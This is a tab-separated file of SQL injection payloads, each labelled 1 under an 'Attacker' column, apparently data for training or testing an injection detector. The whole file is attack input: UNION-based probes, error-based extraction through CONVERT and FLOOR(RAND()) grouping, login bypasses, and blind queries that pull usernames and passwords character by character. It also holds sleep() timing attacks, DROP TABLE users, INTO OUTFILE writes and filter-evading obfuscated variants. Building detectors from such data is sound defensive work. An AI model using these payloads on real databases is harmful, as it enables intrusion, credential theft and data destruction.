Payload	Attacker
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))	1
AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)	1
AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- 	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#	1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#	1
'-'	1
' '	1
'*'	1
' or ''-'	1
' or ''^'	1
' or ''*'	1
"""&"""	1
"""^"""	1
""" or """" """	1
""" or """"&"""	1
or true--	1
""" or true--"	1
') or true--	1
' or 'x'='x	1
""" or ""x""=""x"	1
""") or (""x"")=(""x"	1
or 1=1--	1
or 1=1#	1
admin' #	1
admin'/*	1
admin' or '1'='1'#	1
admin' or '1'='1'/*	1
admin' or 1=1--	1
admin' or 1=1#	1
admin') or ('1'='1'--	1
admin') or ('1'='1'#	1
admin') or '1'='1'--	1
admin') or '1'='1'#	1
"admin"" --"	1
"admin"" #"	1
"admin"" or ""1""=""1""--"	1
"admin"" or ""1""=""1""#"	1
"admin"" or 1=1"	1
"admin"" or 1=1--"	1
"admin"") or (""1""=""1"	1
"admin"") or (""1""=""1""--"	1
"admin"") or ""1""=""1"	1
"admin"") or ""1""=""1""--"	1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055"	1
&()o1: select * from users where id=1 or (\)=1 union select 1,@@VERSION -- 1	1
&(1)o: select * from users where id=1 or (1)=1 union select 1,banner from v$version where rownum=1 -- 1	1
&(1UE: select * from users where id=1 or (\+)=1 union select 1,@@VERSION -- 1	1
&.o&1: select * from users where id=1 or \.<\ or 1=1 -- 1	1
&.o1&: select * from users where id=1 or \.<1 or 1=1 -- 1	1
&.on&: select * from users where id=1 or \.<$ or 1=1 -- 1	1
&.onU: select * from users where id=1 or \.<$ union select 1,@@VERSION -- 1	1
&1UEv: select * from users where id=1 ||1 union select null,banner from v$version where rownum=1 -- 1	1
&1c: select * from users where id=1   or 1=1 -- 1	1
&1ooU: select * from users where id=1 or \+<\ union select 1,@@VERSION -- 1	1
&1oon: select * from users where id=1 or \+<$ union select 1,@@VERSION -- 1	1
&n1&1: select * from users where id=1 or $ 1=1 or 1=1 -- 1	1
&n1UE: select * from users where id=1 or $ 1=1 union select 1,@@VERSION -- 1	1
&no.U: select * from users where id=1 or $<\. union select 1,@@VERSION -- 1	1
&noUE: select * from users where id=1 or $<\ union select 1,@@VERSION -- 1	1
&nooU: select * from users where id=1 or $+<\ union select 1,@@VERSION -- 1	1
&noon: select * from users where id=1 or $+<$ union select 1,@@VERSION -- 1	1
&o1&1: select * from users where id=1 or \<1 or 1=1 -- 1	1
&o1UE: select * from users where id=1 or \<1 union select 1,@@VERSION -- 1	1
&on&1: select * from users where id=1 or \<$ or 1=1 -- 1	1
&onUE: select * from users where id=1 or \<$ union select 1,@@VERSION -- 1	1
&ov&1: select * from users where id=1 or !<@ or 1=1 -- 1	1
&ovUE: select * from users where id=1 or !<@ union select 1,version() -- 1	1
&voo1: select * from users where id=1 or @<@=1 union select 1,version() -- 1	1
)&1c: select * from users where id=1 +(\) or 1=1 -- 1	1
.&1c: select * from users where id=1. or 1=1 -- 1	1
.&vUE: select * from users where id=1.&&@ union select 1,version() -- 1	1
.UE1,: select * from users where id=1.  union select 1,version() -- 1	1
.UE1k: select * from users where id=1. union select 1,banner from v$version where rownum=1 -- 1	1
.UEvc: select * from users where id=1 +\. union select null,@@VERSION -- 1	1
.UEvk: select * from users where id=1. union select null,banner from v$version where rownum=1 -- 1	1
.o.UE: select * from users where id=1.<@. union select 1,version() -- 1	1
.o1&1: select * from users where id=1.*1 or 1=1 -- 1	1
.oUE1: select * from users where id=1. <@ union select 1,version() -- 1	1
.oUEf: select * from users where id=1. <@ union select version(),version() -- 1	1
.onUE: select * from users where id=1.<@$ union select 1,version() -- 1	1
.ov&1: select * from users where id=1.%@ or 1=1 -- 1	1
1&1c: select * from users where id=1 +1 or 1=1 -- 1	1
1)&1c: select * from users where id=1 +(1) or 1=1 -- 1	1
1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1	1
1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1	1
1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1	1
1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1	1
1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1	1
1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1	1
1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1	1
1oon&: select * from users where id=1 + \+%$ or 1=1 -- 1	1
UE1&1: select * from users where id=1 union select 1||1,version() -- 1	1
UE1&v: select * from users where id=1 union select 1||@,version() -- 1	1
UE11n: select * from users where id=1 union select 1 1a,version() -- 1	1
UE1f(: select * from users where id=1 union select 1<@$,version() -- 1	1
UE1n: select * from users where id=1 union select 1`\`,version() -- 1	1
UE1nc: select * from users where id=1 union select 1a#,banner from v$version where rownum=1 -- 1	1
UE1o,: select * from users where id=1 union select 1<@,version() -- 1	1
UE1o.: select * from users where id=1 union select 1<@.,version() -- 1	1
UEoo1: select * from users where id=1 union select +!<1,version() -- 1	1
UEoov: select * from users where id=1 union select +!<@,version() -- 1	1
UEv&v: select * from users where id=1 union select @&&@,version() -- 1	1
UEv11: select * from users where id=1 union select @ 1$,version() -- 1	1
UEvf(: select * from users where id=1 union select @<@$,version() -- 1	1
UEvkn: select * from users where id=1   union select null,banner from v$version where rownum=1 -- 1	1
UEvo,: select * from users where id=1 union select @<@,version() -- 1	1
UEvo.: select * from users where id=1 union select @<@.,version() -- 1	1
n.UEv: select * from users where id=1 +$ . union select null,@@VERSION -- 1	1
n1&1c: select * from users where id=1 +$ 1 or 1=1 -- 1	1
no)&1: select * from users where id=1 + ($+) or 1=1 -- 1	1
no)UE: select * from users where id=1 + ($+) union select null,@@VERSION -- 1	1
noUEv: select * from users where id=1 +$+ union select null,@@VERSION -- 1	1
noo&1: select * from users where id=1 + $+%\ or 1=1 -- 1	1
nooUE: select * from users where id=1 + $+*\ union select null,@@VERSION -- 1	1
noon&: select * from users where id=1 + $+%$ or 1=1 -- 1	1
o()&1: select * from users where id=1 %(\) or 1=1 -- 1	1
o()UE: select * from users where id=1 *(\) union select null,@@VERSION -- 1	1
o(n)&: select * from users where id=1 %($) or 1=1 -- 1	1
o(v)&: select * from users where id=1 %(@) or 1=1 -- 1	1
o..UE: select * from users where id=1<@.. union select 1,version() -- 1	1
o.UE1: select * from users where id=1 <@. union select 1,version() -- 1	1
o.n&1: select * from users where id=1 <@.$ or 1=1 -- 1	1
o.nUE: select * from users where id=1 <@.$ union select 1,version() -- 1	1
o1UEv: select * from users where id=1 *1 union select null,banner from v$version where rownum=1 -- 1	1
o1c: select * from users where id=1 <1## union select 1,version() -- 1	1
oUEvc: select * from users where id=1 *\ union select null,@@VERSION -- 1	1
on&1c: select * from users where id=1 <@$ or 1=1 -- 1	1
on1&1: select * from users where id=1 %$ 1 or 1=1 -- 1	1
on1UE: select * from users where id=1 %$ 1 union select null,@@VERSION -- 1	1
oo&1c: select * from users where id=1 <@<@ or 1=1 -- 1	1
oo1&1: select * from users where id=1 %!<1 or 1=1 -- 1	1
ooUEf: select * from users where id=1 <@<@ union select version(),version() -- 1	1
ooUEv: select * from users where id=1 <@<@ union select null,version() -- 1	1
os: select * from users where id=1 <@$$ union select 1,version() -- 1	1
ov&1c: select * from users where id=1 &@ or 1=1 -- 1	1
s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'	1
s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'	1
s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'	1
s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'	1
s&1c: select * from users where id='1'   or 1=1 -- 1'	1
s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'	1
s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'	1
s&no&: select * from users where id='1' or $<\ or 1=1 -- 1'	1
s&noo: select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'	1
s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1'	1
s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'	1
s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'	1
s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'	1
s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1'	1
s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'	1
s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'	1
"s(.s: select * from users where id=1 or ""(."" or 1=1 -- 1"	1
"s(1s: select * from users where id=1 or ""(1"" or 1=1 -- 1"	1
"s(?s: select * from users where id=1 or ""(]"" or 1=1 -- 1"	1
"s(UE1: select * from users where id=1 or 1#""( union select 1,version() -- 1"	1
"s(UEv: select * from users where id=1 or 1#""( union select null,version() -- 1"	1
"s(c: select * from users where id=1 or ""(#"" or 1=1 -- 1"	1
"s(o1&: select * from users where id=1 or @#""(=1 or 1=1 -- 1"	1
"s(o1U: select * from users where id=1 or @#""(=1 union select 1,version() -- 1"	1
"s({s: select * from users where id=1 or ""({"" or 1=1 -- 1"	1
"s)(s: select * from users where id=1 or "")(""=1 or 1=1 -- 1"	1
"s)1s: select * from users where id=1 or "")1"" or 1=1 -- 1"	1
"s):s: select * from users where id=1 or ""):"" or 1=1 -- 1"	1
"s)n: select * from users where id=1 or "")["" or 1=1 -- 1"	1
"s)ns: select * from users where id=1 or "")$"" or 1=1 -- 1"	1
"s,(s: select * from users where id=1 or "",("" or 1=1 -- 1"	1
"s,)s: select * from users where id=1 or "",)""=1 or 1=1 -- 1"	1
"s,:s: select * from users where id=1 or "",:""=1 or 1=1 -- 1"	1
"s,;s: select * from users where id=1 or "",;"" or 1=1 -- 1"	1
"s,UEf: select * from users where id=1 or 1#"", union select version(),version() -- 1"	1
"s,UEs: select * from users where id=1 or 1#"", union select 'a',version() -- 1"	1
"s,o1&: select * from users where id=1 or 1#"",=1 or 1=1 -- 1"	1
"s,o1U: select * from users where id=1 or @#"",=1 union select 1,version() -- 1"	1
"s.(s: select * from users where id=1 or "".("" or 1=1 -- 1"	1
"s.)s: select * from users where id=1 or "".)"" or 1=1 -- 1"	1
"s.:s: select * from users where id=1 or "".:""=1 or 1=1 -- 1"	1
"s.;s: select * from users where id=1 or "".;"" or 1=1 -- 1"	1
"s.UEf: select * from users where id=1 or 1#"". union select version(),version() -- 1"	1
"s.UEs: select * from users where id=1 or 1#"". union select 'a',version() -- 1"	1
"s.n: select * from users where id=1 or "".["" or 1=1 -- 1"	1
"s.ns: select * from users where id=1 or ""._"" or 1=1 -- 1"	1
"s.os: select * from users where id=1 or "".%"" or 1=1 -- 1"	1
"s.v: select * from users where id=1 or "".@"" or 1=1 -- 1"	1
"s1)s: select * from users where id=1 or ""1)"" or 1=1 -- 1"	1
"s1: select * from users where id=1 or ""1,"" or 1=1 -- 1"	1
"s1?s: select * from users where id=1 or ""1]"" or 1=1 -- 1"	1
"s1UE1: select * from users where id=1 or 1#""1 union select 1,version() -- 1"	1
"s1UEv: select * from users where id=1 or 1#""1 union select null,version() -- 1"	1
"s1c: select * from users where id=1 or ""1#"" or 1=1 -- 1"	1
"s1os: select * from users where id=1 or ""1&"" or 1=1 -- 1"	1
"s1{s: select * from users where id=1 or ""1{"" or 1=1 -- 1"	1
"s:(s: select * from users where id=1 or "":(""=1 or 1=1 -- 1"	1
"s:)s: select * from users where id=1 or "":)""=1 or 1=1 -- 1"	1
"s:1s: select * from users where id=1 or "":1"" or 1=1 -- 1"	1
"s:;s: select * from users where id=1 or "":;""=1 or 1=1 -- 1"	1
"s:UEf: select * from users where id=1 or 1#"": union select version(),version() -- 1"	1
"s:UEs: select * from users where id=1 or 1#"": union select 'a',version() -- 1"	1
"s:n: select * from users where id=1 or "":["" or 1=1 -- 1"	1
"s:ns: select * from users where id=1 or "":$"" or 1=1 -- 1"	1
"s:v: select * from users where id=1 or "":@"" or 1=1 -- 1"	1
"s:{s: select * from users where id=1 or "":{"" or 1=1 -- 1"	1
"s;)s: select * from users where id=1 or "";)""=1 or 1=1 -- 1"	1
"s;,s: select * from users where id=1 or "";,""=1 or 1=1 -- 1"	1
"s;:s: select * from users where id=1 or "";:""=1 or 1=1 -- 1"	1
"s;?s: select * from users where id=1 or "";]"" or 1=1 -- 1"	1
"s;UEs: select * from users where id=1 or 1#""; union select 'a',version() -- 1"	1
"s;UEv: select * from users where id=1 or 1#""; union select null,version() -- 1"	1
"s;ns: select * from users where id=1 or "";_"" or 1=1 -- 1"	1
"s;o1&: select * from users where id=1 or @#"";=1 or 1=1 -- 1"	1
"s;s: select * from users where id='1' union select "";""_,version() -- 1'"	1
"s;v: select * from users where id=1 or "";@"" or 1=1 -- 1"	1
"s?(s: select * from users where id=1 or ""?("" or 1=1 -- 1"	1
"s?)s: select * from users where id=1 or ""])"" or 1=1 -- 1"	1
"s?.s: select * from users where id=1 or ""]."" or 1=1 -- 1"	1
"s?1s: select * from users where id=1 or ""]1"" or 1=1 -- 1"	1
"s??s: select * from users where id=1 or ""??"" or 1=1 -- 1"	1
"s?UE1: select * from users where id=1 or 1#""? union select 1,version() -- 1"	1
"s?UEv: select * from users where id=1 or 1#""? union select null,version() -- 1"	1
"s?c: select * from users where id=1 or ""?#"" or 1=1 -- 1"	1
"s?o1&: select * from users where id=1 or 1#""?=1 or 1=1 -- 1"	1
"s?o1U: select * from users where id=1 or 1#""?=1 union select 1,version() -- 1"	1
"s?v: select * from users where id=1 or ""?@"" or 1=1 -- 1"	1
"s?{s: select * from users where id=1 or ""]{"" or 1=1 -- 1"	1
sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'	1
sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'	1
sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'	1
sUE.o: select * from users where id='1' union select \.%1,@@VERSION -- 1'	1
"sUE1s: select * from users where id='1' union select 1""!"",banner from v$version where rownum=1 -- 1'"	1
sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'	1
sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'	1
sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'	1
sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'	1
sUEov: select * from users where id='1' union select !<@,version() -- 1'	1
sUEvv: select * from users where id='1' union select @ @1,version() --  1'	1
"s\c: select * from users where id=1 or ""\#"" or 1=1 -- 1"	1
"sn: select * from users where id='1' union select ""[""_,version() -- 1'"	1
"sn:s: select * from users where id=1 or ""$:"" or 1=1 -- 1"	1
"snUE1: select * from users where id=1 or 1#""$ union select 1,version() -- 1"	1
"snUEf: select * from users where id=1 or 1#""$ union select version(),version() -- 1"	1
"snc: select * from users where id=1 or ""$#"" or 1=1 -- 1"	1
"snn: select * from users where id=1 or ""$["" or 1=1 -- 1"	1
"snv: select * from users where id=1 or ""$@"" or 1=1 -- 1"	1
"sn{s: select * from users where id=1 or ""_{"" or 1=1 -- 1"	1
so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'	1
so(1): select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'	1
"so,s: select * from users where id=1 or ""%,"" or 1=1 -- 1"	1
so..&: select * from users where id='1'<@.. or 1=1 -- 1'	1
so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'	1
"so.s: select * from users where id=1 or ""%."" or 1=1 -- 1"	1
"so1s: select * from users where id=1 or ""%1"" or 1=1 -- 1"	1
"so:s: select * from users where id=1 or ""&:"" or 1=1 -- 1"	1
soc: select * from users where id='1' + @<@# union select 1,version() -- 1'	1
son.&: select * from users where id='1' *$ . or 1=1 -- 1'	1
"son: select * from users where id=1 or ""%["" or 1=1 -- 1"	1
sonn&: select * from users where id='1' <@$_ or 1=1 -- 1'	1
soo&1: select * from users where id='1' + $+%\ or 1=1 -- 1'	1
soo1&: select * from users where id='1' <@&1 or 1=1 -- 1'	1
soon&: select * from users where id='1' + $+%$ or 1=1 -- 1'	1
soonU: select * from users where id='1' + $+*$ union select 1,@@VERSION -- 1'	1
soovU: select * from users where id='1' %!<@ union select 1,version() -- 1'	1
sos: select * from users where id='1'<@$$ union select 1,version() -- 1'	1
sov1o: select * from users where id='1' + @ 1! union select 1,version() -- 1'	1
sovvU: select * from users where id='1' + @ @1 union select 1,version() -- 1'	1
"sv)s: select * from users where id=1 or ""@)"" or 1=1 -- 1"	1
"sv:s: select * from users where id=1 or ""@:""=1 or 1=1 -- 1"	1
"svUE1: select * from users where id=1 or 1#""@ union select 1,version() -- 1"	1
"svUEf: select * from users where id=1 or 1#""@ union select version(),version() -- 1"	1
"svc: select * from users where id=1 or ""@#"" or 1=1 -- 1"	1
"svos: select * from users where id=1 or ""@%"" or 1=1 -- 1"	1
"s{,s: select * from users where id=1 or ""{,""=1 or 1=1 -- 1"	1
"s{.s: select * from users where id=1 or ""{."" or 1=1 -- 1"	1
"s{;s: select * from users where id=1 or ""{;"" or 1=1 -- 1"	1
"s{?s: select * from users where id=1 or ""{?"" or 1=1 -- 1"	1
"s{UEs: select * from users where id=1 or 1#""{ union select 'a',version() -- 1"	1
"s{UEv: select * from users where id=1 or 1#""{ union select null,version() -- 1"	1
"s{o1U: select * from users where id=1 or @#""{=1 union select 1,version() -- 1"	1
"s{os: select * from users where id=1 or ""{%"" or 1=1 -- 1"	1
v: select * from users where id=1 + @`\` union select 1,version() -- 1	1
vc: select * from users where id=1 + @<1# union select 1,version() -- 1	1
voUEf: select * from users where id=1 -@<@ union select version(),version() -- 1	1
voUEv: select * from users where id=1 -@<@ union select null,version() -- 1	1
?id=) OR (SELECT password FROM users ...	1
?id=123);DROP TABLE users--	1
?id=1337 INTO OUTFILE ‘xxx’--	1
?id=)-sleep(9999	1
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'	1
'XOR(if(now()=sysdate(),sleep(5*5*0),0))OR'	1
sleep(9999)	1
)-sleep(9999	1
123;DROP%20TABLE%20users--	1
123);DROP%20TABLE%20users--	1
8888'+AND+'1'+LIKE+'1 -->	1
8888'+AND+'2'+LIKE+'1 -->	1
' and 1=1--+	1
' and 1=2--+	1
' and substring(@@version,1,1)=4--+	1
' and substring(@@version,1,1)=5--+	1
' and (SELECT 1 from tblAdmin limit 0,1)=1--+	1
' and (SELECT 1 from Administrator limit 0,1)=1--+	1
' and (SELECT 1 from users limit 0,1)=1--+	1
' and (SELECT 1 from TableName limit 0,1)=1--+	1
' and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1--+	1
' and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=1--+	1
' and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65--+	1
' and ascii(substring((SELECT concat(ColumnName1,0x3a,ColumnName2) from <table-Name> where <ColumnCondition=Value>),N,1))Insert<>=Comparer<InsertCharValueHere>--+	1
' or 5050=5050--+	1
' or 5050=5051--+	1
' or ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>--+	1
' or (SELECT 1 from admin limit 0,1)=1--+	1
' or (SELECT 1 from tbl_admin limit 0,1)=1--+	1
' or (SELECT 1 from user limit 0,1)=1--+	1
' or (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1--+	1
' or (SELECT substring(concat(1,name),1,1) from tblAdmin limit 0,1)=1--+	1
' or (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1--+	1
' or (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1--+	1
and 1=1--	1
and 1=2--	1
and substring(@@version,1,1)=4--	1
and substring(@@version,1,1)=5--	1
and (SELECT 1 from tblAdmin limit 0,1)=1--	1
and (SELECT 1 from Administrator limit 0,1)=1--	1
and (SELECT 1 from users limit 0,1)=1--	1
and (SELECT 1 from TableName limit 0,1)=1--	1
and (SELECT substring(concat(1,login),1,1) from Administrator limit 0,1)=1--	1
and (SELECT substring(concat(1,password),1,1) from user limit 0,1)=1--	1
and ascii(substring((SELECT concat(username,0x3a,password) from users where userid=1),1,1))>65--	1
and ascii(substring((SELECT concat(ColumnName1,0x3a,ColumnName2) from <table-Name> where <ColumnCondition=Value>),N,1))Insert<>=Comparer<InsertCharValueHere>--	1
or 5050=5050--	1
or 5050=5051--	1
or ORD(MID((VERSION()), N, 1)) Insert<>=Comparer<InsertCharValueHere>--	1
or (SELECT 1 from admin limit 0,1)=1--	1
or (SELECT 1 from tbl_admin limit 0,1)=1--	1
or (SELECT 1 from user limit 0,1)=1--	1
or (SELECT substring(concat(1,ID),1,1) from admin limit 0,1)=1--	1
or (SELECT substring(concat(1,name),1,1) from tblAdmin limit 0,1)=1--	1
or (SELECT substring(concat(1,email),1,1) from users limit 0,1)=1--	1
or (SELECT substring(concat(1,<insert-column-guess-here>),1,1) from <table-name> limit 0,1)=1--	1
+and(select 1 FROM(select count(*),concat((select (select concat(version())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
+and(select 1 FROM(select count(*),concat((select (select concat(user())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
+and(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
+and(select 1 FROM(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,count(schema_name),0x27,0x7e) FROM information_schema.schemata LIMIT 0,1)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables GROUP BY x)a)	1
+and(select 1 FROM(select count(*),concat((select (select (SELECT concat(0x7e,0x27,count(column_name),0x27,0x7e) FROM `information_schema`.columns WHERE table_schema=<HEX_VLAUE_OF_DB_NAME> AND table_name=<HEX_VLAUE_OF_TABLE_NAME>)) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)	1
